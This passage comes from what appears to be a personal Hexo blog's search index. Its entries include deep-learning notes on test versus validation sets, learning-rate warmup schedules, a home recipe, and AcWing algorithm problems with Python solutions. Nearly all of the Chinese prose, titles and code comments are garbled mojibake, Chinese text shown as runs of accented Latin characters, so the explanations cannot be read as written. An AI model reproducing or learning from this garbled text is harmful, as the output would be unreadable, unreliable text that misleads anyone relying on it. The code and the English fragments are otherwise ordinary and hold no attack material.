æ­¤ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è®¤ä¸ºï¼ŒéªŒè¯é›†ä¹Ÿå‚ä¸äº†è®­ç»ƒï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ä½¿å¾—æ¨¡å‹å»overfitéªŒè¯é›†<br>é‚£ä¸ºä»€ä¹ˆè¿˜éœ€è¦æµ‹è¯•é›†ï¼Ÿ<br>æ—¢ç„¶éªŒè¯é›†å‚ä¸äº†ä¸€ä¸ªâ€œäººå·¥è°ƒå‚â€çš„è¿‡ç¨‹ï¼Œé‚£ä¹ˆå°±è¿˜éœ€è¦ä¸€ä¸ª<strong>å®Œå…¨æ²¡æœ‰ç»è¿‡è®­ç»ƒçš„é›†åˆï¼Œé‚£å°±æ˜¯æµ‹è¯•é›†ï¼Œæˆ‘ä»¬æ—¢ä¸ç”¨æµ‹è¯•é›†æ¢¯åº¦ä¸‹é™ï¼Œä¹Ÿä¸ç”¨å®ƒæ¥æ§åˆ¶è¶…å‚æ•°ï¼Œåªæ˜¯åœ¨æ¨¡å‹æœ€ç»ˆè®­ç»ƒå®Œæˆåï¼Œç”¨æ¥æµ‹è¯•ä¸€ä¸‹æœ€åå‡†ç¡®ç‡ï¼Œç¡®å®šæ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›å¼ºå¼±ã€‚</strong></li></ol>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€è°ƒä¼˜æ–¹æ³•ã€‘â€”â€”warmup</title>
      <link href="/2021/07/08/%E3%80%90%E8%B0%83%E4%BC%98%E6%96%B9%E6%B3%95%E3%80%91%E2%80%94%E2%80%94warmup/"/>
      <url>/2021/07/08/%E3%80%90%E8%B0%83%E4%BC%98%E6%96%B9%E6%B3%95%E3%80%91%E2%80%94%E2%80%94warmup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å­¦ä¹ ç‡æ˜¯æ¨¡å‹è®­ç»ƒä¸­æœ€é‡è¦çš„è¶…å‚ä¹‹ä¸€ï¼Œé’ˆå¯¹å­¦ä¹ ç‡çš„ä¼˜åŒ–æœ‰å¾ˆå¤šç§æ–¹æ³•ï¼Œè€Œwarmupæ˜¯å…¶ä¸­é‡è¦çš„ä¸€ç§ã€‚</p></blockquote><h1 id="ä»€ä¹ˆæ˜¯warmup"><a href="#ä»€ä¹ˆæ˜¯warmup" class="headerlink" title="ä»€ä¹ˆæ˜¯warmup"></a>ä»€ä¹ˆæ˜¯warmup</h1><p>warmupæ˜¯ä¸€ç§å­¦ä¹ ç‡ä¼˜åŒ–æ–¹æ³•ï¼ˆæœ€æ—©å‡ºç°åœ¨ResNetè®ºæ–‡ä¸­ï¼‰ã€‚åœ¨æ¨¡å‹è®­ç»ƒä¹‹åˆé€‰ç”¨è¾ƒå°çš„å­¦ä¹ ç‡ï¼Œè®­ç»ƒä¸€æ®µæ—¶é—´ä¹‹åï¼ˆå¦‚ï¼š10epochesæˆ–10000stepsï¼‰ä½¿ç”¨é¢„è®¾çš„å­¦ä¹ ç‡è¿›è¡Œè®­ç»ƒï¼› </p><h1 id="ä¸ºä»€ä¹ˆä½¿ç”¨warmup"><a href="#ä¸ºä»€ä¹ˆä½¿ç”¨warmup" class="headerlink" title="ä¸ºä»€ä¹ˆä½¿ç”¨warmup"></a>ä¸ºä»€ä¹ˆä½¿ç”¨warmup</h1><h2 id="ç†æ€§åˆ†æ"><a href="#ç†æ€§åˆ†æ" class="headerlink" title="ç†æ€§åˆ†æ"></a>ç†æ€§åˆ†æ</h2><p>å› ä¸ºæ¨¡å‹çš„weightsæ˜¯éšæœºåˆå§‹åŒ–çš„ï¼Œå¯ä»¥ç†è§£ä¸ºè®­ç»ƒä¹‹åˆæ¨¡å‹å¯¹æ•°æ®çš„â€œç†è§£ç¨‹åº¦â€ä¸º0ï¼ˆå³ï¼šæ²¡æœ‰ä»»ä½•å…ˆéªŒçŸ¥è¯†ï¼‰ï¼Œåœ¨ç¬¬ä¸€ä¸ªepochesä¸­ï¼Œæ¯ä¸ªbatchçš„æ•°æ®å¯¹æ¨¡å‹æ¥è¯´éƒ½æ˜¯æ–°çš„ï¼Œæ¨¡å‹ä¼šæ ¹æ®è¾“å…¥çš„æ•°æ®è¿›è¡Œå¿«é€Ÿè°ƒå‚ï¼Œæ­¤æ—¶å¦‚æœé‡‡ç”¨è¾ƒå¤§çš„å­¦ä¹ ç‡çš„è¯ï¼Œæœ‰å¾ˆå¤§çš„å¯èƒ½ä½¿æ¨¡å‹å¯¹äºæ•°æ®â€œè¿‡æ‹Ÿåˆâ€ï¼ˆâ€œå­¦åâ€ï¼‰ï¼Œåç»­éœ€è¦æ›´å¤šçš„è½®æ¬¡æ‰èƒ½â€œæ‹‰å›æ¥â€ï¼›<br>å½“æ¨¡å‹è®­ç»ƒä¸€æ®µæ—¶é—´ä¹‹åï¼ˆå¦‚ï¼š10epochesæˆ–10000stepsï¼‰ï¼Œæ¨¡å‹å¯¹æ•°æ®å…·æœ‰ä¸€å®šçš„å…ˆéªŒçŸ¥è¯†ï¼Œæ­¤æ—¶ä½¿ç”¨è¾ƒå¤§çš„å­¦ä¹ ç‡æ¨¡å‹å°±ä¸å®¹æ˜“å­¦â€œåâ€ï¼Œå¯ä»¥ä½¿ç”¨è¾ƒå¤§çš„å­¦ä¹ ç‡åŠ é€Ÿæ¨¡å‹æ”¶æ•›ï¼›<br>å½“æ¨¡å‹ä½¿ç”¨è¾ƒå¤§çš„å­¦ä¹ ç‡è®­ç»ƒä¸€æ®µæ—¶é—´ä¹‹åï¼Œæ¨¡å‹çš„åˆ†å¸ƒç›¸å¯¹æ¯”è¾ƒç¨³å®šï¼Œæ­¤æ—¶ä¸å®œä»æ•°æ®ä¸­å†å­¦åˆ°æ–°ç‰¹ç‚¹ï¼Œå¦‚æœä»ä½¿ç”¨è¾ƒå¤§çš„å­¦ä¹ ç‡ä¼šç ´åæ¨¡å‹çš„ç¨³å®šæ€§ï¼Œè€Œä½¿ç”¨å°å­¦ä¹ ç‡æ›´å®¹æ˜“è·å–local optimaã€‚</p><h2 id="æ„Ÿæ€§åˆ†æ"><a href="#æ„Ÿæ€§åˆ†æ" class="headerlink" title="æ„Ÿæ€§åˆ†æ"></a>æ„Ÿæ€§åˆ†æ</h2><p>åˆšå¼€å§‹æ¨¡å‹å¯¹æ•°æ®å®Œå…¨ä¸äº†è§£ï¼Œè¿™ä¸ªæ—¶å€™æ­¥å­å¤ªå¤§ï¼Œå®¹æ˜“æ‰¯ç€danï¼Œæ­¤æ—¶éœ€è¦ä½¿ç”¨å°å­¦ä¹ ç‡æ‘¸ç€çŸ³å¤´è¿‡æ²³ï¼›<br>å¯¹æ•°æ®äº†è§£äº†ä¸€æ®µæ—¶é—´ä¹‹åï¼Œå¯ä»¥ä½¿ç”¨å¤§å­¦ä¹ ç‡æœç€ç›®æ ‡å¤§æ­¥å‘å‰ï¼›<br>å¿«æ¥è¿‘ç›®æ ‡æ—¶ï¼Œä½¿ç”¨å°å­¦ä¹ ç‡è¿›è¡Œæ¢ç´¢ï¼Œæ­¤æ—¶æ­¥å­å¤ªå¤§ï¼Œå®¹æ˜“é”™è¿‡æœ€è¿‘ç‚¹ï¼› </p><h1 id="å¸¸ç”¨çš„warmup"><a href="#å¸¸ç”¨çš„warmup" class="headerlink" title="å¸¸ç”¨çš„warmup"></a>å¸¸ç”¨çš„warmup</h1><p>â€‹</p><h2 id="Constant-Warmup"><a href="#Constant-Warmup" class="headerlink" title="Constant Warmup"></a>Constant Warmup</h2><pre><code>å­¦ä¹ ç‡ä»éå¸¸å°çš„æ•°å€¼çº¿æ€§å¢åŠ åˆ°é¢„è®¾å€¼ä¹‹åä¿æŒä¸å˜ï¼Œå…¶å­¦ä¹ ç‡çš„ç³»æ•°å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š </code></pre><p><img src="https://z3.ax1x.com/2021/07/08/RLtuqg.png"></p><p>â€‹</p><h2 id="Linner-Warmup"><a href="#Linner-Warmup" class="headerlink" title="Linner Warmup"></a>Linner Warmup</h2><p>å­¦ä¹ ç‡ä»éå¸¸å°çš„æ•°å€¼çº¿æ€§å¢åŠ åˆ°é¢„è®¾å€¼ä¹‹åï¼Œç„¶åå†çº¿æ€§å‡å°ã€‚å…¶å­¦ä¹ ç‡çš„ç³»æ•°å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚<br><img src="https://z3.ax1x.com/2021/07/08/RLtrJ1.png"></p><p>â€‹</p><h2 id="Cosine-Warmup"><a href="#Cosine-Warmup" class="headerlink" title="Cosine Warmup"></a>Cosine Warmup</h2><p>å­¦ä¹ ç‡å…ˆä»å¾ˆå°çš„æ•°å€¼çº¿æ€§å¢åŠ åˆ°é¢„è®¾å­¦ä¹ ç‡ï¼Œç„¶åæŒ‰ç…§coså‡½æ•°å€¼è¿›è¡Œè¡°å‡ã€‚å…¶å­¦ä¹ ç‡ç³»æ•°å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚<br><img src="https://z3.ax1x.com/2021/07/08/RLtqOS.png"><br>â€‹</p><blockquote><p>è½¬è‡ª<a href="https://blog.csdn.net/dendi_hust/article/details/104465337">https://blog.csdn.net/dendi_hust/article/details/104465337</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é†‹æºœé¥¹é¦‡åšæ³•</title>
      <link href="/2021/07/08/%E9%86%8B%E6%BA%9C%E9%A5%B9%E9%A6%87%E5%81%9A%E6%B3%95/"/>
      <url>/2021/07/08/%E9%86%8B%E6%BA%9C%E9%A5%B9%E9%A6%87%E5%81%9A%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>â€‹</p><h1 id="é¥¹é¦‡"><a href="#é¥¹é¦‡" class="headerlink" title="é¥¹é¦‡"></a>é¥¹é¦‡</h1><p>é¢ç²‰<br>ç»¿è±†ç²‰<br>é¸¡è›‹<br>ç”Ÿèœ/è’œé»„<br>è’œ<br>é†‹10ml<br>é…±æ²¹10ml<br>ç™½ç³–4-5g<br>å‘³ç²¾1.5g</p><h1 id="åšæ³•"><a href="#åšæ³•" class="headerlink" title="åšæ³•"></a>åšæ³•</h1><h2 id="åˆ¶ä½œé¥¹é¦‡"><a href="#åˆ¶ä½œé¥¹é¦‡" class="headerlink" title="åˆ¶ä½œé¥¹é¦‡"></a>åˆ¶ä½œé¥¹é¦‡</h2><p>å¹³åº•é”…åŠ æ²¹ï¼Œæ”¾å…¥é¢ç²‰ç»¿è±†ç²‰é¸¡è›‹*2çš„æ··åˆç‰©<br>â€‹</p><h2 id="å‰©ä¸‹çš„æ­¥éª¤"><a href="#å‰©ä¸‹çš„æ­¥éª¤" class="headerlink" title="å‰©ä¸‹çš„æ­¥éª¤"></a>å‰©ä¸‹çš„æ­¥éª¤</h2><p>èµ·é”…çƒ§æ²¹æ”¾è’œ<br>åŠ ç”Ÿèœè¿›å»ç‚’ç‚’<br>åŠ è°ƒæ–™ï¼ˆé™¤å‘³ç²¾<br>é¥¹é¦‡æ”¾è¿›å»ç‚’ç‚’<br>å…³ç«æ”¾å‘³ç²¾<br>â€‹</p><p>æ¥ï¼Œè¯•è¯•çœ‹</p>]]></content>
      
      
      <categories>
          
          <category> æ–™ç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¸­å›½æ–™ç† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021AcWingæ¯æ—¥ä¸€é¢˜Â·æš‘å‡</title>
      <link href="/2021/07/06/2021AcWing%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%C2%B7%E6%9A%91%E5%81%87/"/>
      <url>/2021/07/06/2021AcWing%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%C2%B7%E6%9A%91%E5%81%87/</url>
      
        <content type="html"><![CDATA[<h1 id="3761-å”¯ä¸€æœ€å°æ•°"><a href="#3761-å”¯ä¸€æœ€å°æ•°" class="headerlink" title="3761. å”¯ä¸€æœ€å°æ•°"></a>3761. å”¯ä¸€æœ€å°æ•°</h1><p>ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º n çš„æ•´æ•°æ•°ç»„ a1,a2,â€¦,ana1,a2,â€¦,anã€‚<br>è¯·ä½ æ‰¾åˆ°æ•°ç»„ä¸­åªå‡ºç°è¿‡ä¸€æ¬¡çš„æ•°å½“ä¸­æœ€å°çš„é‚£ä¸ªæ•°ã€‚<br>è¾“å‡ºæ‰¾åˆ°çš„æ•°çš„<strong>ç´¢å¼•ç¼–å·</strong>ã€‚<br>a1 çš„ç´¢å¼•ç¼–å·ä¸º 1ï¼Œa2 çš„ç´¢å¼•ç¼–å·ä¸º 2ï¼Œâ€¦ï¼Œan çš„ç´¢å¼•ç¼–å·ä¸º nã€‚</p><h4 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° Tï¼Œè¡¨ç¤ºå…±æœ‰ T ç»„æµ‹è¯•æ•°æ®ã€‚<br>æ¯ç»„æ•°æ®ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° nnã€‚<br>ç¬¬äºŒè¡ŒåŒ…å« nn ä¸ªæ•´æ•° a1,a2,â€¦,ana1,a2,â€¦,anã€‚</p><h4 id="è¾“å‡ºæ ¼å¼"><a href="#è¾“å‡ºæ ¼å¼" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>æ¯ç»„æ•°æ®è¾“å‡ºä¸€è¡Œç»“æœï¼Œå³æ»¡è¶³æ¡ä»¶çš„æ•°çš„ç´¢å¼•ç¼–å·ï¼Œå¦‚æœä¸å­˜åœ¨æ»¡è¶³æ¡ä»¶çš„æ•°ï¼Œåˆ™è¾“å‡º âˆ’1âˆ’1ã€‚</p><h4 id="æ•°æ®èŒƒå›´"><a href="#æ•°æ®èŒƒå›´" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>1â‰¤Tâ‰¤2Ã—1041â‰¤Tâ‰¤2Ã—104,<br>1â‰¤nâ‰¤2Ã—1051â‰¤nâ‰¤2Ã—105,<br>1â‰¤aiâ‰¤n1â‰¤aiâ‰¤n,<br>åŒä¸€æµ‹è¯•ç‚¹å†…çš„æ‰€æœ‰ nn çš„å’Œä¸è¶…è¿‡ 2Ã—1052Ã—105ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š"><a href="#è¾“å…¥æ ·ä¾‹ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><p>6<br>2<br>1 1<br>3<br>2 1 3<br>4<br>2 2 2 3<br>1<br>1<br>5<br>2 3 2 4 2<br>6<br>1 1 5 5 4 4 </p><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><p>-1 2 4 1 2 -1</p><h4 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">input</span>())):</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line">    temp = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">    dic = &#123;j : i <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(temp)&#125;</span><br><span class="line">    Dic = collections.Counter(temp)</span><br><span class="line"></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> Dic.items():</span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">1</span>:</span><br><span class="line">            res.append(i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">        <span class="built_in">print</span>(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(dic[<span class="built_in">min</span>(res)]+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">è®²è§£ï¼š</span><br><span class="line">è¯»å–è¾“å…¥:<span class="built_in">input</span>()</span><br><span class="line"><span class="built_in">map</span>å‡½æ•°:<span class="built_in">map</span>(function,<span class="built_in">list</span>) <span class="comment">#å³å¯¹listä¸­çš„æ¯ä¸€ä¸ªæ•°è¿›è¡Œfunctionæ“ä½œ</span></span><br><span class="line"><span class="built_in">enumerate</span>(temp):å¯¹tempä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ çš„ä¸‹æ ‡å’Œå€¼æˆå¯¹å–å‡º</span><br><span class="line">dic = &#123;j : i <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(temp)&#125;:ä¸ºåˆ—è¡¨ç”Ÿæˆå¼</span><br><span class="line">collections.Counter(temp):å¯¹åˆ—è¡¨ä¸­çš„å…ƒç´ è¿›è¡Œè®¡æ•°ï¼Œè¿”å›ä¸€ä¸ªdic</span><br><span class="line">Dic.items():é€ä¸ªè¿”å›Dicä¸­çš„é”®å€¼å¯¹</span><br><span class="line"><span class="built_in">min</span>(<span class="built_in">list</span>):è¿”å›<span class="built_in">list</span>ä¸­æœ€å°å€¼</span><br></pre></td></tr></table></figure><h1 id="3762-äºŒè¿›åˆ¶çŸ©é˜µ"><a href="#3762-äºŒè¿›åˆ¶çŸ©é˜µ" class="headerlink" title="3762. äºŒè¿›åˆ¶çŸ©é˜µ"></a>3762. äºŒè¿›åˆ¶çŸ©é˜µ</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/21769886/1625875707267-ede60d3b-85b5-4a8d-9549-3ad3df858cc7.png#clientId=u5517ba36-6917-4&from=paste&height=824&id=u17bbd5fc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=824&originWidth=752&originalType=binary&ratio=1&size=87074&status=done&style=none&taskId=u4b2180db-7eb9-4e8b-bbb2-05023397a44&width=752" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">T = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span>(<span class="params">i1, j1, i2, j2, i3, j3</span>):</span></span><br><span class="line">        <span class="keyword">if</span> nums[i1][j1] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            nums[i1][j1] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            nums[i1][j1] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nums[i2][j2] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            nums[i2][j2] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            nums[i2][j2] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nums[i3][j3] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            nums[i3][j3] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            nums[i3][j3] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(i1+<span class="number">1</span>, j1+<span class="number">1</span>, i2+<span class="number">1</span>, j2+<span class="number">1</span>, i3+<span class="number">1</span>, j3+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(T):</span><br><span class="line">    n, m = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">    nums = []</span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        tmp = <span class="built_in">list</span>(<span class="built_in">input</span>())</span><br><span class="line">        nums.append(tmp)</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> tmp:</span><br><span class="line">            <span class="keyword">if</span> c == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                ans += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(ans*<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            <span class="keyword">if</span> nums[i][j] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> i + <span class="number">1</span> == n <span class="keyword">and</span> j + <span class="number">1</span> == m:</span><br><span class="line">                swap(i, j, i, j-<span class="number">1</span>, i-<span class="number">1</span>, j-<span class="number">1</span>)</span><br><span class="line">                swap(i, j, i, j-<span class="number">1</span>, i-<span class="number">1</span>, j)</span><br><span class="line">                swap(i, j, i-<span class="number">1</span>, j, i-<span class="number">1</span>, j-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> i + <span class="number">1</span> == n:</span><br><span class="line"></span><br><span class="line">                swap(i, j, i-<span class="number">1</span>, j, i-<span class="number">1</span>, j+<span class="number">1</span>)</span><br><span class="line">                swap(i, j, i-<span class="number">1</span>, j, i, j+<span class="number">1</span>)</span><br><span class="line">                swap(i, j, i, j+<span class="number">1</span>, i-<span class="number">1</span>, j+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> j + <span class="number">1</span> == m:</span><br><span class="line">                swap(i, j, i, j-<span class="number">1</span>, i+<span class="number">1</span>, j)</span><br><span class="line">                swap(i, j, i, j-<span class="number">1</span>, i+<span class="number">1</span>, j-<span class="number">1</span>)</span><br><span class="line">                swap(i, j, i+<span class="number">1</span>, j, i+<span class="number">1</span>, j-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> i + <span class="number">1</span> &lt; n <span class="keyword">and</span> j + <span class="number">1</span> &lt; m:</span><br><span class="line">                swap(i, j, i+<span class="number">1</span>, j, i, j+<span class="number">1</span>)</span><br><span class="line">                swap(i, j, i+<span class="number">1</span>, j, i+<span class="number">1</span>, j+<span class="number">1</span>)</span><br><span class="line">                swap(i, j, i, j+<span class="number">1</span>, i+<span class="number">1</span>, j+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> n, m = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">    nums = []</span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        tmp = <span class="built_in">list</span>(<span class="built_in">input</span>())</span><br><span class="line">        nums.append(tmp)</span><br><span class="line">:æ­¤å¤„ä¸ºpythonè¯»å–çŸ©é˜µæ•°æ®çš„æ–¹æ³•</span><br><span class="line">è§£é¢˜æ€è·¯:ä»»ä½•ä¸€ä¸ªâ€˜<span class="number">1</span>â€™éƒ½å¯ä»¥é€šè¿‡ä¸‰æ¬¡Lå‹å˜æ¢å˜æˆâ€˜<span class="number">0</span>â€˜ï¼ŒåŒæ—¶ä¿è¯å…¶ä»–å…ƒç´ ä¸å˜ã€‚å¦å¤–æ­¤é¢˜ä¸è¦æ±‚æœ€ä¼˜è§£ï¼Œåˆç†å³å¯ã€‚</span><br></pre></td></tr></table></figure><h1 id="3763-æ•°å­—çŸ©é˜µ"><a href="#3763-æ•°å­—çŸ©é˜µ" class="headerlink" title="3763. æ•°å­—çŸ©é˜µ"></a>3763. æ•°å­—çŸ©é˜µ</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/21769886/1626177506700-62beb68e-2e26-474d-a1d5-a56761863f16.png#clientId=u987d9ee7-a599-4&from=paste&height=464&id=ud499b461&margin=%5Bobject%20Object%5D&name=image.png&originHeight=464&originWidth=648&originalType=binary&ratio=1&size=57926&status=done&style=none&taskId=u5164e78f-02a6-4814-8726-b0d67c7e0eb&width=648" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">T = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(T):</span><br><span class="line">    n, m = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">    res, v, cnt = <span class="number">0</span>, <span class="number">10000</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())):</span><br><span class="line">            res += <span class="built_in">abs</span>(a)</span><br><span class="line">            <span class="keyword">if</span> a &lt; <span class="number">0</span>: cnt += <span class="number">1</span></span><br><span class="line">            v = <span class="built_in">min</span>(v, <span class="built_in">abs</span>(a))</span><br><span class="line">    <span class="keyword">if</span> cnt % <span class="number">2</span> == <span class="number">1</span>: res -= <span class="number">2</span> * v</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çŸ©é˜µä¸­ä»»æ„ä¸¤ä¸ªä½ç½®çš„å€¼éƒ½å¯ä»¥åšä¸€æ¬¡å˜æ¢ï¼Œé‚£å¦‚æœçŸ©é˜µä¸­è´Ÿæ•°çš„ä¸ªæ•°æ˜¯å¶æ•°ä¸ªï¼Œé‚£æœ€ç»ˆçŸ©é˜µä¸­æ‰€æœ‰å€¼éƒ½ä¼šå˜æˆæ­£æ•°ï¼Œå¦‚æœæ˜¯å¥‡æ•°ä¸ªï¼Œé‚£åªéœ€è¦ä¿ç•™ç»å¯¹å€¼æœ€å°çš„é‚£ä¸ªå€¼å³å¯ï¼Œå³<span class="number">4</span>å¯¹çŸ©é˜µä¸­æ‰€æœ‰å…ƒç´ æ±‚å’Œå†å‡å»ä¸¤å€çš„æœ€å°å€¼ã€‚</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç›®æ ‡æ£€æµ‹ï¼ˆä¸Šç¯‡ï¼‰</title>
      <link href="/2021/07/01/%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%E4%B8%8A/"/>
      <url>/2021/07/01/%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%E4%B8%8A/</url>
      
